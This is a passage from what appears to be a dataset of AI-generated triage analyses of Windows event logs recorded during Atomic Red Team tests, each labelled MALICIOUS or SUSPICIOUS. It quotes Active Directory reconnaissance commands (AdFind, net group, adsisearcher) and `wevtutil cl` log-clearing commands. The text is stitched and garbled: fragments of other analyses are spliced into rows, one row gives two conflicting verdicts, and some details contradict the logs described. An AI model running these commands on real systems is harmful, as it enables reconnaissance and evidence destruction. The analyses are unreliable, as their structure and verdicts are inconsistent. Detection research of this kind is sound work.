Given the evidence from the logs, including unauthorized script execution and log clearing activities aimed at hiding evidence of actions, the assessment concludes that these actions are **MALICIOUS**.

### Guidance on How to Proceed

1. **Immediate Containment**:
   - Isolate the affected systems to prevent further potential damage or lateral movement.
   
2. **Incident Response**:
   - Conduct a thorough investigation to determine the extent of the breach.

Permission Groups Discovery PowerShell (Domain),"In reviewing the provided Windows event logs, several patterns and specific events suggest a degree of suspicious activity. Here's a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Usage of `wevtutil.exe`:** 
   - The `wevtutil.exe` utility is frequently executed to clear various Windows Event Logs (Sysmon, Application, System, Security, and PowerShell channels). This behavior is particularly concerning as it can be indicative of attempts to cover tracks after performing unauthorized operations.
   - EventID 104 in the System log, and EventID 1102 in the Security log indicate log clearing activities.

2. **High Integrity Level Processes:**
   - Multiple processes such as `whoami.exe`, `wevtutil.exe`, and `wevtutil.exe` instances are running at a high integrity level, indicating they have elevated privileges. While not inherently malicious, it is noteworthy in conjunction with other activities.

3. **Execution of PowerShell Command:**
   - A PowerShell command is executed (`get-ADPrincipalGroupMembership $env:USERNAME | select name`). This command retrieves Active Directory group memberships, which can be part of reconnaissance activities to understand the logged-on user's privileges and groups.
   - PowerShell logging (EventID 600) captures this activity, highlighting a potentially automated execution script.

4. **Logon by Admin User:**
   - The activity is primarily carried out by the `admin_test` user who appears to be actively engaged in these operations. The admin_test user executes high-integrity level processes and clears logs, which is unusual and suspicious for a normal admin user’s duties.

### Indicators of Malicious Activity or Compromise:
The combination of elevated privilege process executions, log tampering with `wevtutil.exe`, and PowerShell activity involving querying sensitive information strongly suggest possible malicious intent or unauthorized administrative actions.

### Assessment of the Situation:
- **Threats Identified:** Tampering with event logs and running privileged commands can indicate an intruder is attempting to cover their tracks after potentially compromising the system.
- **Risks:** The primary risk is that unauthorized users may have gained access to sensitive information or control over the system. If logs are being cleared, it indicates efforts to prevent detection of further malicious activities.

### Guidance and Resolution:
- **Investigation and Mitigation Steps:**
  - Verify the legitimacy of the scripts and commands executed by the `admin_test` user.
  - Review access to `wevtutil.exe` and limit its usage to verified users and scripts.
  - Conduct a thorough review of recent administrative activities on the server, including remote connections and other privileged accounts.
  - Implement enhanced logging and monitoring to detect similar activities in the future.
  - Reassess permissions for the `admin_test` account and ensure no unauthorized privileges are granted.

Given the combination of anomalies and the particular focus on clearing event logs and querying Active Directory details using PowerShell, the resolution for this scenario is:
- **SUSPICIOUS:** The logs contain activities that don't look right and warrant further investigation to confirm their legitimacy or uncover potential security compromises."
Remote System Discovery - net group Domain Computers,"Based on the analysis of the provided event logs, there are several events that stand out and warrant further scrutiny due to potential indicators of malicious activity:

### Analysis Summary

1. **Log Clearing:**
   - Events in the System log indicate that logs were cleared (EventID 104 from Microsoft-Windows-Eventlog) for both the System and Windows PowerShell channels by the user ""admin_test."" This sort of behavior is often associated with attempts to cover tracks after unauthorized or suspicious activity, as log clearing can hinder forensic analysis.

2. **Use of `wevtutil.exe`:**
   - Multiple entries in the Sysmon logs show the usage of `wevtutil.exe` to clear logs for different channels (EventID 1). The `wevtutil` command-line utility is commonly used to manage event logs, and clearing logs without a legitimate reason is considered suspicious.
   - The presence of `ProcessId` values associated with `wevtutil.exe`, such as `ProcessId: 3032` for System log clear and `ProcessId: 1012` for PowerShell log clear, correlate with the log-clearing activities in the system logs.

3. **Privileged Logon and Elevated Privileges:**
   - Security logs (EventID 4672) show that the ""admin_test"" account was granted a set of high-level privileges, including `SeDebugPrivilege`, which is often exploited in privilege escalation attacks. This account performed actions that required high integrity level, as seen in the Sysmon logs.

4. **Execution of `cmd.exe` with Network Commands:**
   - A notable command line was executed using `cmd.exe` (Sysmon EventID 1), specifically:
     - `""cmd.exe"" /c net group ""Domain Computers"" /domain`
     - This command attempts to list all domain computers, which could indicate reconnaissance activity within the network.

### Conclusion and Resolution

Taking into account the above details, the event logs contain multiple indications of potentially malicious activity:

- Log clearing is a common indicator of evasion techniques.
- High-level privilege usage without clear justification.
- Execution of potentially suspicious network enumeration commands.

Given these observations, further investigation and immediate response actions are necessary to ascertain any unauthorized activities and mitigate potential threats.

   - The logs contain multiple entries of event logs being cleared (Event ID 104 in the System log and Event ID 1102 in the Security log). Specifically, logs related to the System, Windows PowerShell, and Security channels were cleared by the user ""admin_test."" The clearing of logs is often an attempt to cover tracks and is typically seen in malicious activity.

2. **Suspicious Use of `wevtutil.exe`:**
   - The presence of `wevtutil.exe` with the command-line argument for clearing logs ('cl') across various channels, including System, Application, and Security, executed by ""admin_test"" suggests an intentional log clearing activity. This further supports the suspicion of malicious behavior.

3. **Privileged Processes:**
   - Several processes were executed under a high or system integrity level by the user ""SERVER002\admin_test"" such as `cmd.exe`, `whoami.exe`, and `svchost.exe`, the latter involving time change operations. While time synchronization can be a routine task, it might be worth examining the context in which it was performed given the surrounding suspicious activity.

4. **Instrumentation and Obfuscation Attempts:**
   - There is evidence of possibly benign updates related to Microsoft Edge Update, which executed under `NT AUTHORITY\SYSTEM.` However, such updates usually follow predictable behavior. In this context, given the coordinated clearing of logs and execution of processes as noted earlier, they might warrant a closer look to ensure these were legitimate updates and not being used as a cover for malicious payloads.

5. **Execution of Diagnostic Commands:**
   - Execution of utilities like `whoami` and `hostname` by ""admin_test"" within a short timeframe might be used to gather information about the current user and system environment as part of a reconnaissance phase of an ongoing attack.

### Assessment:
Based on the aggregated information, there is substantial suspicion of activities attempting to conceal actions on the host. The combination of event log clearing and the use of potentially misused tools like `wevtutil` to clear critical logs implies these activities may be an effort to cover up a compromise.

Enumerate Active Directory Groups with ADSISearcher,"Based on the examination of the provided logs, here are the key observations and indicators of suspicious or potentially malicious activity:

1. **Log Clearing Events**: 
   - There are multiple instances where logs have been cleared. In the System log, Event ID 104 at `2024-10-23 13:40:52.5595533` and `2024-10-23 13:40:52.6736286` indicate the clearing of log files by the user `SERVER002\\admin_test`. Similarly, in the Security log, Event ID 1102 at `2024-10-23 13:40:52.6202752` shows the clearing of the Security log by the same user.
   - Clearing of event logs is often considered suspicious as it can be an attempt to hide unauthorized or malicious activities.

2. **Unusual PowerShell Execution**: 
   - A PowerShell process with a complex command line is logged in the Sysmon logs. The command `([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()` appears to query Active Directory for group information, which might indicate reconnaissance activity.
   - EventRecordID 17977 shows the PowerShell execution, initiated by the `wsmprovhost.exe` process, suggesting that PowerShell commands might have been run remotely or in an automated fashion.

3. **Time Change Events**:
   - The Security and System logs both include Event ID 4616, indicating a time change event. The time was set back from `2024-10-23 13:40:58.6471848` to `2024-10-23 13:40:55.1533379`. 
   - Time changes can be indicative of attempts to alter timestamps for forensic evasion.

4. **Remote Management Host**:
   - The `wsmprovhost.exe` process, logged in several events, is a legitimate process used for Windows remote management, but its presence as the parent process in multiple executions suggests remote command execution.

5. **High Integrity Level**:
   - Many processes were executed with High Integrity, which is a heightened privilege level and may be necessary for tasks that require administrative rights.

**Assessment**: 
- The activities logged, particularly the clearing of logs, execution of PowerShell commands with directory and system integrity, and time changes, strongly suggest an attempt to cover tracks and gather information, which is consistent with malicious behavior.

Remote Desktop Services Discovery via PowerShell,"### Detailed Log Analysis:

Upon reviewing the provided Windows event logs, we have identified the following events that are of interest:

#### System Log:
1. **EventID 104 (Log File Cleared):**
   - The logs indicate multiple occurrences where the log files for ""System"" and ""Windows PowerShell"" have been cleared by the user ""admin_test"".
   - Log clearing activities executed via `wevtutil.exe` are suspicious especially if done without documentation or approval, as they could be an attempt to cover malicious activities.

2. **EventID 24 and EventID 1 (Time Change):**
   - Time synchronization events executed by `svchost.exe` are recorded. While these can be legitimate, frequent or unexpected alterations could suggest an attempt to obfuscate log timestamps.

#### Sysmon Log:
1. **Process Creation Records (EventID 1):**
   - The execution of `wevtutil.exe` for clearing event logs, followed by the execution of `conhost.exe` suggests command shell activity potentially used for issuing these commands.
   - Frequent use of `wevtutil.exe` to clear multiple logs (`System`, `Security`, `Application`, `Windows PowerShell`) is highly indicative of covering tracks after unauthorized activity.

2. **PowerShell Execution:**
   - There is a PowerShell execution event attempting to interact with remote services (`Get-Service -Name ""Remote Desktop Services"", ""Remote Desktop Configuration""`). This could be an attempt to control or gather information on remote desktop configurations.
   
#### Security Log:
1. **EventID 1102 (Audit Log Cleared):**
   - The security audit logs have been cleared by ""admin_test"", which is a significant red flag and often a direct indicator of malicious intent.

2. **EventID 4624 and 4672 (Logon and Special Privileges):**
   - A network logon type (Logon Type 3) by ""admin_test"" with elevated privileges like `SeDebugPrivilege` is noted. Such privileges allow overriding security mechanisms, potentially leading to credential dumping or modifications.

#### Windows PowerShell Log:
- Consistent with Sysmon logs, PowerShell commands executed for getting services related to remote desktops. If this action is not approved or expected, it may be indicative of reconnaissance or lateral movement efforts.

### Assessment:
The activity in these logs indicates deliberate actions to hide potentially unauthorized access or activities. The clearing of multiple log types by the admin account, combined with the execution of system utilities (`wevtutil.exe` and PowerShell) known to be used for system recon and log manipulation, suggests intent to evade detection.

### Resolution: MALICIOUS

   - Notify legal and compliance teams if necessary, based on the severity and impact."
Port Scan using python,"Upon reviewing the provided Windows event logs, several indicators suggest potentially suspicious activity on the Windows host:

1. **PowerShell Script Execution**: 
   - The logs indicate the use of PowerShell to execute a script located in a temporary directory associated with the Atomic Red Team, a well-known library of techniques used to test security controls against adversary behavior.
   - The script appears to download and execute a Python installer (`python-3.10.4-amd64.exe`) using PowerShell, which is later executed with silent installation arguments. This behavior is often associated with attempts to install software without user awareness, potentially for malicious purposes.

2. **Command Execution**:
   - The PowerShell execution command indicates the running of a Python script (`T1046.py`) which is associated with the T1046 technique (also from MITRE ATT&CK) related to network service discovery. This is indicative of reconnaissance activity, possibly to collect information on network resources.

3. **Clearing of Event Logs**:
   - There are entries indicating that the security, system, and PowerShell event logs were cleared. This is often an attempt by malicious actors to hide their tracks and avoid detection by removing evidence of their activity.

4. **Use of Administrative Privileges**:
   - Entries in the security log show user `admin_test` clearing the event logs, suggesting administrative privileges are being utilized, which could facilitate further malicious activity.

Given the combination of:
- Execution and installation of software from potentially untrusted sources.
- Indications of reconnaissance through network service discovery.
- Log clearing activities which are commonly used to cover tracks.

These factors suggest a likelihood of targeted malicious actions aimed at performing reconnaissance, possibly preparing the ground for further compromise or data exfiltration.

**Resolution**: **MALICIOUS**

2. **Process Execution Context**:
   - The `wevtutil.exe` commands were initiated by a high-integrity-level session (`IntegrityLevel: High`) from an administrative user (`User: SERVER002\\admin_test`). This indicates that the actions were performed with sufficient privileges.
   - Parent processes of these logs were consistently `wsmprovhost.exe`, which could hint that these actions might have been remotely triggered or are being executed in the context of a remote session.

3. **Use of Common Windows Tools**:
   - `Conhost.exe` and other system utilities like `whoami.exe` and `cmd.exe` were observed running, but they were spawned as part of normal activities that could relate to system information queries and configurations, possibly related to regular administrative activity.

4. **System and Application Behavior**:
   - The Windows Defender status shows it’s active (`SECURITY_PRODUCT_STATE_ON`), and updates for Defender Antivirus were being applied as evident from the Windows Update logs related to Microsoft Defender Antivirus.
   - The presence of `wuauclt.exe` and associated commands in the logs indicates routine update checks and installations.

From the information above, the most concerning activity is the clearing of the event logs using the `wevtutil.exe` utility, which is suspicious as it often precedes or follows malicious activities. However, without corroborative evidence about what happened before or after these logs were cleared, confirming malicious intent with complete certainty is complex.

**Assessment**:  
The activity of clearing logs is suspicious and warrants further investigation. It is vital to check for other contexts or alerts, especially regarding network connections, to/from `Server002`, or any endpoint detection and response (EDR) alerts around this time. Furthermore, contact the user `admin_test` to confirm if the log clearance was an authorized administrative action or not.

**Resolution**:  
**SUSPICIOUS** - The logs contain activities, specifically the clearing of critical logs, which appear suspicious and necessitate additional investigative steps to confirm or rule out malicious intent. Further detailed examination and corroborative context are needed to finalize this assessment."
Win32_PnPEntity Hardware Inventory,"After analyzing the provided Windows event logs, there are several observations and indications of potentially malicious activities:

1. **Clearing of Logs:** 
   - Multiple instances where `wevtutil.exe` was used to clear event logs. This is seen in the following events:
     - `2024-10-25 10:18:23.590` System log was cleared by the process with ID `4884`.
     - `2024-10-25 10:18:23.725` Windows PowerShell log was cleared by the process with ID `5936`.
     - `2024-10-25 10:18:23.641` Security logs were cleared as indicated by EventID `1102`.
   - Clearing event logs is a common tactic used by attackers to cover their tracks after making changes or executing malicious payloads.

2. **Suspicious PowerShell Execution:**
   - The PowerShell command executed at `2024-10-25 10:18:24.036` collects information about `Win32_PnPEntity` and stores it in a temporary file `T1120_collection.txt`. This behavior can mimic information gathering techniques.
   - The script attempts to sort and unique the data, which further suggests data preparation or manipulation possibly before exfiltration.

3. **Use of High Integrity Processes and Commands:**
   - Processes such as `wevtutil.exe` and `powershell.exe` were executed under high integrity levels, suggesting elevated privileges.
   - High integrity levels often imply that the executing user has administrative rights, which is typically required for critical system operations, including log manipulation or execution of system-level tasks.

4. **Command-Line Arguments:**
   - The `wevtutil.exe` was executed with clear log commands over various channels. This administrative utility being used to manipulate logs without a known legitimate administrative task should be regarded as suspicious.

5. **Process Parentage and Account Usage:**
   - Processes were typically executed by `SERVER002\\admin_test`, indicating the use of a potentially compromised administrative account.
   - Correlation of process parentage suggests coordinated or scripted task execution, usually seen in automated task deployment contexts, whether legitimate or for malicious purposes.

**Guidance and Recommendations:**
- **Resolution: MALICIOUS:** The events strongly indicate malicious activity due to the log clearing actions and suspicious PowerShell usage.
- **Immediate Steps:**
  - Isolate `Server002` from the network to prevent further potential malicious activity or data exfiltration.
  - Conduct a thorough investigation on the `admin_test` account for any signs of compromise or unauthorized use.
  - Restore the cleared logs if possible and inspect backup or shadow copies for additional forensic artifacts.
  - Increase monitoring on similar server activities and incorporate specific detections for log-clearing commands.
- **Long-term Actions:**
  - Review and tighten security policies around privileged accounts and command execution logging.
  - Implement more comprehensive logging solutions with centralized logging that cannot be easily cleared by local administrators."
operating system discovery,"Upon reviewing the provided Windows event logs, I have identified several entries that indicate potentially suspicious activity. Below is a detailed analysis of the logs:

### System Log Analysis:

1. **Event ID 104 (Log File Cleared):**
   - **Time Created:** 2024-10-23 18:49:09
   - Multiple log files, including the System and Windows PowerShell logs, were cleared by the user `admin_test`. Clearing logs is an action often associated with attempts to cover tracks after conducting suspicious activities.

### Security Log Analysis:

1. **Event ID 1102 (Audit Log Cleared):**
   - **Time Created:** 2024-10-23 18:49:09
   - The security audit logs were cleared by the user `admin_test`, which is a significant red flag as it often serves to hide unauthorized activities.

### Sysmon Log Analysis:

1. **Event ID 1 & Event ID 5 (Process Creation and Termination):**
   - **Time Created:** Multiple entries at 2024-10-23 18:49:09
   - Processes such as `wevtutil.exe` were used to clear multiple event logs (""System"", ""Security"", and ""Windows PowerShell""). This suggests an attempt to tamper with or erase logs, which is consistent with log-clearing events observed.
   
2. **Associated Processes:**
   - `wevtutil.exe` is known for managing event logs and is typically used in scripted attacks or by an attacker seeking to cover operational traces.

### PowerShell Log Analysis:

1. **Automatic Execution of PowerShell Commands:**
   - **Time Created:** 2024-10-23 18:49:11
   - PowerShell was executed with Get-CimInstance commands, which is commonly used by administrators but could indicate enumeration or baseline checks by an attacker seeking information about the environment.

### Conclusion:

The combination of cleared logs across multiple channels and the timing of such activities strongly suggest the presence of unauthorized or malicious behavior. The user `admin_test` appears to have executed these actions deliberately, likely to cover malicious activities. The use of legitimate system utilities like `wevtutil.exe` to clear log entries and the running of PowerShell commands may indicate a sophisticated attempt to obfuscate actions and avoid detection.

### Recommendation:

Based on the analysis, the resolution for this set of logs is:

- **MALICIOUS**

Actions to take:
- Immediately investigate the account `admin_test` for any unauthorized access or activity.
- Review system access logs and modify credentials if necessary.
- Conduct a broader forensic analysis on `Server002` to determine the scope and impact of the activities.
- Implement tighter security controls such as logging integrity checks and restricting the use of utilities like `wevtutil.exe`.

It is crucial to understand how access was obtained and ensure remediation steps are taken to prevent future incidents."
Adfind - Enumerate Active Directory Trusts,"### Detailed Analysis:

1. **Log Clearing Events:**
   - In the Security log, event ID 1102 shows that the security log was cleared by the user `admin_test`.
   - In the System log, event ID 104 shows the system log was cleared by the same user.
   - The clearing of event logs, especially by a non-system user, is a significant indicator of potential malicious activity as it is often used to hide tracks after unauthorized activities.

2. **Suspicious Command-line Activity:**
   - **wevtutil.exe**: Multiple invocations of `wevtutil.exe` with the `cl` (clear) command on various logs such as Microsoft-Windows-Sysmon, Application, System, Security, and Windows PowerShell channels. This aligns with the log clearing events and is used to delete entries from log files.
   - **AdFind.exe Execution**: The command-line `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\AdFind.exe""  -gcb -sc trustdmp` indicates usage of AdFind, a tool frequently used for reconnaissance in Active Directory environments. This could potentially be part of an attack toolkit, such as the one used for lateral movement or privilege escalation.
   - **whoami.exe and hostname.exe** usage appears benign by themselves; however, they are frequently used in conjunction with attack chains to gather information about the system and user context.

3. **Process Activity:**
   - **PowerShell Execution**: PowerShell was executed with the user `admin_test`. PowerShell is often leveraged by attackers post-exploitation to execute further payloads or commands.
   - **wsmprovhost.exe**: This is another process associated with windows remote management tasks, and coupled with the process examination, could have been used for administrative commands.
   - **TiWorker.exe and TrustedInstaller.exe**: These system processes are legitimate and relate to Windows Module Installer tasks but could be leveraged maliciously for persistence by advanced threat actors, especially if seen running at unusual times or intervals.

4. **High Integrity Level Processes:**
   - Several processes are executed with high integrity levels, which is expected for system processes but warrants investigation when used in conjunction with suspicious commands/scripts.

5. **Security and System Logs:**
   - Regular logging of Windows Defender state implies no significant changes to antivirus settings were detected, which is typical system behavior but doesn’t necessarily mean the absence of a threat.
   
### Assessment:
The presence of log clearing activities, the execution of potentially malicious command-line operations, and the overall context of user actions under `admin_test` strongly indicate efforts to obfuscate actions on the system and gather detailed system/environment information.

### Resolution:
- **Resolution: MALICIOUS:** 
  The log entries contain indicators of compromise, such as log clearing, command-line usage (particularly of AdFind and log clearing utilities), and high-level integrity processes by a standard user account. These actions combined suggest malicious intent with an objective of reconnaissance and covering tracks post-activity.

### Recommended Actions:
- Perform a thorough forensic investigation on the host to identify further tools or signs of compromise.
- Enhance logging and monitoring of high-value accounts and processes.
- Conduct a security audit of accounts with log clearing capabilities.
- Evaluate network-wide threat hunting for similar activities across other hosts.
- User `admin_test` should be reviewed for any unauthorized access or compromise.
"
Remote System Discovery - nltest,"Upon analyzing the provided logs, a few points of potential interest and concern can be highlighted:

1. **Clearing of Windows Event Logs**: 
   - Multiple instances of the `wevtutil.exe cl` command were executed by the user `SERVER002\admin_test`. These commands were used to clear logs from the `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security` logs. This action is generally suspicious as it can be an indicator of an attempt to hide malicious activity.
   - Corresponding Security events (ID 1102) indicate that security logs were cleared, and they were executed from the same user. This suggests a deliberate action to cover tracks.

2. **Execution of System Processes**:
   - Various processes typically associated with system operations and updates like `wuauclt.exe`, `AM_Delta.exe`, `MpSigStub.exe`, `MicrosoftEdgeUpdate.exe`, and others were executed. These are normal operations related to system updates and don't immediately appear malicious.

3. **Credential Access Failure**:
   - Repeated EventID 5379 entries indicate attempts to access credentials were continually failing with the return code `3221226021` (STATUS_NO_SUCH_LOGON_SESSION), which can occur during unsuccessful processing of a logon session. It may indicate persistent yet failing attempts to access certain service or account credentials (`MicrosoftAccount:user=02txoixylodcstop`).

4. **Privilege Levels**:
   - Various legitimate processes and services were seen executing with elevated privileges (e.g., SYSTEM, NT AUTHORITY), which is typical behavior for system updates and processes but is noteworthy given the context of log clearing activities by an administrative user.

Given the analysis, the most significant red flag is the clearing of logs by the admin account, which is often a strong indicator of potentially malicious activity. The execution of certain system processes appears benign on its own, but when coupled with the log clearing activity, it becomes more suspect.

**Resolution: SUSPICIOUS**

Given the above findings, particularly the cleansing of event logs, the activity should be marked as suspicious. Additional forensic analysis is recommended, focusing on:
- Reviewing any correlating network or endpoint activities during the same timeframe.
- Inspect logs from other security tools (e.g., EDR solutions) that might provide additional context not visible here.
- Interviewing the involved user (if possible) to validate intentions behind the log clearing actions. 

Further investigation into the motivation and scope of these activities would be prudent before reaching a conclusion of either benign intent or full compromise."
GetCurrent User with PowerShell Script,"**Detailed Analysis of Logs:**

After reviewing the provided event logs from the Windows machine, several entries raise concerns about possible malicious activities:

1. **Clearing of Event Logs:**
   - The security log shows an `Event ID 1102`, indicating that the security log has been cleared by the user `admin_test`. Similarly, the system log entries `Event ID 104` also indicate that both the System and Windows PowerShell logs were cleared by the same user account `admin_test`.
   - Log clearing is a common tactic used by attackers to hide their tracks after gaining access to a system.

2. **Processes and Activity Linked to System User Privileges:**
   - A logon event with `Event ID 4624` indicates a successful logon with `Logon Type 5`, which suggests a service logon. This was immediately followed by a `Privilege Use Event ID 4672`, where numerous high-level privileges are assigned, such as `SeDebugPrivilege`, which could be used to debug other processes and `SeTakeOwnershipPrivilege`, allowing a process to take control over objects on the system.
   - These events suggest that an account might have escalated its privileges on the system.

3. **Multiple Credential Events:**
   - There are multiple `Event ID 5379` entries attempting to access Microsoft Account credentials with various `ReturnCode` values indicating failure. Such activities may imply attempts to retrieve or manipulate credentials unsuccessfully, potentially pointing to credential harvesting attempts.

4. **System Utilities Invocation:**
   - The Sysmon log shows repeated execution of `wevtutil.exe`, employed to clear event logs, as previously observed with cleared logs.
   - `whoami.exe` and `hostname.exe` are executed potentially for reconnaissance purposes, frequently used to gather information about the current user and system.

5. **Powershell Execution:**
   - Execution of PowerShell with a command `[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt` suggests user identification and logging activity, which might be benign if done by an administrator for scripting purposes, but could be malicious if uninitiated or irregular.

**Assessment:**

The combination of log clearing activities, suspicious command-line utilities execution, evidence of privilege escalation, and attempts associated with credential access strongly indicate malicious intent or a breach. The nature and sequence of these events suggest actions that are typically associated with unauthorized access and potential preparation for further malicious activities.

**Resolution:**

- **MALICIOUS**: There is strong evidence supporting malicious activity due to event log tampering, potential unauthorized privilege escalation, and suspicious utility executions. Immediate response actions should be initiated:
  - Isolate the affected machine from the network to prevent further potential spread of malicious activity.
  - Begin a comprehensive forensic investigation to determine the full scope and impact of the breach.
  - Consider resetting credentials and closely monitoring accounts for unusual activity.
  - Review and reinforce security policies and access controls to mitigate future incidents."
Adfind - Enumerate Active Directory Exchange AD Objects,"Upon reviewing the provided Windows event logs, several observations can be made:

1. **Event Log Clearing Attempt (EventID 1102 and 104):**
   - There are multiple events indicating the clearing of event logs, specifically, Security, System, and Windows PowerShell logs were cleared by the user `admin_test` from `SERVER002`. This is evident from the `wevtutil.exe` executions shown in the Sysmon logs (`ProcessId 4752`, `1392`, `1980`), which executed commands to clear security, system, and PowerShell event logs.
   - The security event log (EventID 1102) and Sysmon logs show this action taken near the same timestamp (2024-10-23 21:11:46). Log clearing can be an attempt to cover tracks after a compromise.

2. **AdFind Tool Execution (Command Line Data):**
   - An instance of `cmd.exe` executing an external payload, particularly `AdFind.exe`, a known tool often used for reconnaissance in Active Directory environments. The command is located in a path resembling `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam`, indicating possible unauthorized reconnaissance activities, indicative of a potential red team exercise or actual threat actor behavior.

3. **Repetitive Logon (EventID 4624) and Privileged User Activities (EventID 4672):**
   - There are repeated logon events for the SYSTEM account with high privileges being used (SeDebugPrivilege, SeTakeOwnershipPrivilege, and others). These privileges are typically necessary for system-level or administrative tasks, further suggesting administrative access exploitation could be involved.
  
4. **Service and Process Creation (Sysmon logs):**
   - Several process creation events and executions of svchost.exe and taskhostw.exe are observed, quite common and expected during routine operations. However, these become noteworthy when considered alongside potential unwanted activities like unauthorized log clearing and suspicious command-line executions.
  
5. **Credential Access and Failed Operations (EventID 5379):**
   - There are multiple records of attempted access and operations related to credentials, with MicrosoftAccount attempts, leading to failures (ReturnCode 3221226021) indicating possible unsuccessful attempts to leverage credentials.

In summary, the logs contain significant indicators of potentially malicious activity:

- The clearing of security logs (EventID 1102) and specific usage of `wevtutil.exe` to remove traces.
- Execution of potential reconnaissance tools like `AdFind.exe`.
- Unauthorized usage and systematic triggering of privileged actions.

Given these findings, the resolution for the situation is **MALICIOUS**. Immediate steps would include:

- Isolating and securing the host machine for forensic investigation.
- Performing comprehensive scans for malware or unauthorized applications.
- Reviewing access permissions for critical accounts and services.
- Monitoring network activity for unusual or unauthorized external communications.
- Revisiting security policies and logs to identify gaps and prevent future incidents."
Suspicious LAPS Attributes Query with Get-ADComputer all properties,"Based on the analysis of the provided Windows event logs, the following observations were made:

### Summary of Findings:
1. **Process Execution and Command-Line Auditing**: 
   - The execution of `wevtutil.exe` commands repeatedly, specifically clearing logs (`cl <logname>`), stands out as particularly suspicious. This utility is often used to manage event logs, and clearing logs can indicate an attempt to cover up malicious activity.
   - The execution of PowerShell with command `Get-ADComputer` appears benign as it retrieves Active Directory data. However, this should be verified in the context of expected behavior for the user or role.

2. **Log Clearance Events**:
   - The logs indicate multiple instances of event log clearance (EventID 104 - System log and EventID 1102 - Security log) by the user `admin_test`. Clearing security logs especially is often a part of post-exploitation activities to cover tracks.

3. **User Account and Privileges**: 
   - The user `admin_test` operated with high integrity levels, indicating administrative privileges, which aligns with potential misuse to carry out unauthorized activities such as log clearance.

4. **System and Network Activities**: 
   - Several processes with NT AUTHORITY\SYSTEM account, such as Microsoft Edge Update, support system-related updates and appear regular. However, they should be cross-checked against expected usage patterns to ensure they were not initiated by tampered processes.

### Recommendations for Resolution:
- **Security Assessment**: Given the suspicious clearance of event logs and use of `wevtutil.exe`, this behavior leans towards potentially malicious actions. Immediate actions should include forensic analysis on the machine to recover what might have been cleared or altered.
  
- **Log Review and Hardening**: Enhance monitoring on administrative accounts and processes that can manipulate event logs. Set up alerts for unusual attempts at log clearing or high-volume PowerShell operations.
  
- **Account Audit**: Review recent activities of `admin_test`; ensure that account actions align with expected administrative tasks. If unexplained behavior is observed, consider it compromised.

Based on the current log review, I am confident in categorizing the activity as:

### Resolution: **MALICIOUS**
The logs demonstrate activities that are closely related to adversarial behaviors, particularly the clearing of security and system event logs by an administrator account which could be indicative of malicious intent. Further investigation is strongly recommended."
Suspicious LAPS Attributes Query with adfind all properties,"### Detailed Analysis:

#### Suspicious and Anomalous Activities Identified:

1. **Event Log Clearing**: 
   - Multiple event logs were cleared, which is often a strong indicator of malicious intent as it can be used to hide evidence of unauthorized activity.
   - System log was cleared by the process with ID 5092 (wevtutil.exe), Security log by process ID 5272, and Windows PowerShell log by process ID 6684. All these operations were performed by the `admin_test` account.

2. **Use of PowerShell with Suspicious Commands**:
   - The logs show the execution of PowerShell with a command that invokes `AdFind.exe`, a tool used for Active Directory enumeration. This behavior can be indicative of reconnaissance activities by an attacker.
   - The PowerShell command executed is: `""powershell.exe"" & {& \""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\AdFind.exe\"" -h $env:USERDOMAIN -s subtree -f \""objectclass=computer\"" *}`. This specific activity aligns with T1087 (Active Directory Discovery) from the MITRE ATT&CK framework, often associated with adversaries gathering information about the environment.

3. **High Integrity Levels**:
   - The processes involved (such as `wevtutil.exe` and `conhost.exe`) ran with high integrity levels, given that the actions like log clearing were performed under an admin account (`admin_test`), which implies a potential privilege misuse or compromise.

4. **Processes Originating from wevtutil.exe**:
   - Multiple instances of `wevtutil.exe` with the command to clear event logs indicate attempts to remove traces of activity. This is generally not a common or routine maintenance task, especially in such a repetitive manner, during a short period.

#### Threats and Risks Identified:
- The actions identified pose a significant risk to the security of the server `Server002`. Clearing event logs and performing reconnaissance within the Active Directory using potentially malicious scripts are activities consistent with common attack patterns.
- The use of PowerShell for executing external tools hidden in temp directories (`AtomicRedTeam` reference) points towards an attempt to conduct stealthy operations after gaining some form of access to the system.

### Guidance on How to Proceed:
1. **Immediate Isolation**: 
   - Isolate the affected system (Server002) from the network to prevent further propagation or data exfiltration.

2. **Credential Review**:
   - Review and reset credentials for `admin_test` and any other potentially compromised accounts.

3. **Conduct a Full Forensic Investigation**:
   - Gather forensic images of the system for detailed analysis and evidence preservation. Focus especially on PowerShell logs, suspicious files in temp directories, and any anomalies in user accounts.

4. **Malware Scanning and Removal**:
   - Conduct thorough malware scans to remove any potential malicious payloads or scripts that may have been dropped on the system.

5. **Review System and Network Logs**:
   - Expand the investigation to review other systems for similar signs of compromise, especially any lateral movements from the Server002.

6. **Implement Enhanced Monitoring**:
   - Set up alerts for any future attempts at log clearing and PowerShell executions that involve external scripts or tools.

### Final Resolution:
- **MALICIOUS** - The cluster of activities and behaviors observed in the logs, including event log clearing, use of `AdFind.exe` through PowerShell, and execution of commands from oft-used temporary directories align with known malicious activities."
Enumerate Active Directory for Unconstrained Delegation,"### Analysis of Logs:

1. **PowerShell Activity:**
   - Multiple PowerShell events show the execution of `Get-ADObject` command with a specific LDAP filter for identifying disabled user accounts. This command is being executed by `powershell.exe`.
   - The command is executed by the user `SERVER002\\admin_test`.

2. **System and Security Event Cleaning:**
   - There are events indicating that the logs for System, Security, and Windows PowerShell have been cleared (`EventID 104` and `EventID 1102`).
   - The logs were cleared by the same user `admin_test` who executed the PowerShell command (`ClientProcessId` and `SubjectUserName` match).

3. **Sysmon Logs:**
   - There are multiple `Image Load (Event ID 5)` and `Process Create (Event ID 1)` entries that show normal system utilities like `conhost.exe`, `wevtutil.exe`, and `taskhostw.exe`.
   - The `wevtutil.exe` command-line logs indicate clearing of event logs, which matches with the cleared logs events. The clearing commands target specific logs, including Sysmon, Application, and Windows PowerShell logs.

4. **Edge Update Processes:**
   - Routine `Microsoft EdgeUpdate` processes are observed, typical for keeping Microsoft Edge updated. These processes are executed by `NT AUTHORITY\\SYSTEM`, which is standard for service-level software updates.

### Suspicious and Anomalous Indicators:

- **Log Clearing Behavior:** 
